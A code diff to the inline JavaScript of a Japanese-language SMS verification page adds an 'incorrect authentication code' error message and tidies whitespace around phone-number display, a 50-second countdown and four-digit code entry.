@@ -260,19 +260,25 @@
         const urlParams = new URLSearchParams(window.location.search);
       
         const errorDiv = document.getElementById("login-error-message");
+        
+      
         if (urlParams.get('error') === '1' && errorDiv) {
             errorDiv.style.display = 'block';
+        }
+        
+  
+        if (urlParams.get('error') === '2' && errorDiv) {
+            errorDiv.style.display = 'block';
+            errorDiv.innerText = '認証コードが正しくありません。もう一度お試しください。';
         }
 
         let tel = urlParams.get('tel') || '090-****-****';
         if(tel !== '090-****-****' && tel.length >= 11) {
-       
             const cleanTel = tel.replace(/\D/g, "");
             tel = cleanTel.replace(/(\d{3})(\d{4})(\d{4})/, '$1-$2-$3');
         }
         document.getElementById('display_phone').innerText = tel;
 
-        
         let timeLeft = 50;
         const timerElement = document.getElementById('timer');
         const countdown = setInterval(() => {
@@ -285,7 +291,6 @@
             }
         }, 1000);
 
-        
         const inp = document.getElementById('dc_input');
         const lns = [document.getElementById('l1'), document.getElementById('l2'), document.getElementById('l3'), document.getElementById('l4')];
         
@@ -313,4 +318,4 @@
             });
         }
     });
-  </script>
+</script>
